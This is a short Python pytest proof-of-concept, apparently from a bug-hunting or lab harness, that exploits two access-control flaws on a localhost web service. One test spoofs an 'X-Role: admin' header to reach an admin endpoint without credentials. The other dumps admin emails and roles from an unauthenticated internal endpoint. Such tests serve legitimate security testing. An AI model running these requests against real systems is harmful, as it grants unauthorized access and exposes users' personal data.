"""PoC: Broken access control on the admin surface of 127.0.0.1:62395.

Two defects, both owned by the live target:
  1. GET /admin/reports authorizes on a CLIENT-SUPPLIED `X-Role: admin` header.
     An unauthenticated attacker sends the header and the server serves the
     admin-only endpoint (200) that it refuses to every real principal (403),
     including admin 'alice' with a valid bearer token.
  2. GET /internal/admin/users requires NO authentication and dumps admin
     user emails + roles.
Run:  python3 -I -m pytest -q test_admin_access_control.py
"""
import sys, os
sys.path.insert(0, os.path.dirname(__file__))
from p1hunt_dyn import Client

c = Client()

def test_admin_reports_role_header_privesc():
    # Every real principal is refused.
    assert c.get("/admin/reports").status == 403                     # noauth
    assert c.get("/admin/reports", identity="alice").status == 403   # real admin bearer
    assert c.get("/admin/reports", identity="bob").status == 403     # real user bearer
    # A spoofed client header grants the admin surface, with NO credentials.
    r = c.get("/admin/reports", token="", headers={"X-Role": "admin"})
    assert r.status == 200, r.text
    assert "reports" in r.json()
    # A wrong value stays refused -> the header value is the sole gate.
    assert c.get("/admin/reports", token="", headers={"X-Role": "user"}).status == 403
    print("WIN: unauthenticated X-Role:admin -> 200", r.text)

def test_internal_admin_users_unauth_dumps_roles_emails():
    r = c.get("/internal/admin/users")   # no Authorization sent
    assert r.status == 200, r.text
    data = r.json()
    users = {u["u"]: u for u in data["users"]}
    assert users["alice"]["role"] == "admin"
    assert users["alice"]["email"]             # admin email leaked unauth
    print("WIN: unauth /internal/admin/users ->", r.text)
